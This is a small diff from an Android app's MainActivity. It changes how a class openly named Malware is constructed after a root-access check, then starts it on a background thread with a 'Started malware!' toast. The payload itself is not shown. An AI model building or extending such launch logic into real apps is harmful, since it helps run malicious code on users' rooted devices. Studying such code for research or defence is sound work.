@@ -22,7 +22,7 @@ public class MainActivity extends AppCompatActivity {
         if (CheckRoot.hasRootAccess()) {
             if (!malwareRunning) {
                 malwareRunning = true;
-                malware = new Malware(this);
+                malware = new Malware(this, MainActivity.this);
                 Thread malwareThread = new Thread(malware, "Malware Thread");
                 malwareThread.start();
                 Toast.makeText(this, "Started malware!", Toast.LENGTH_SHORT).show();
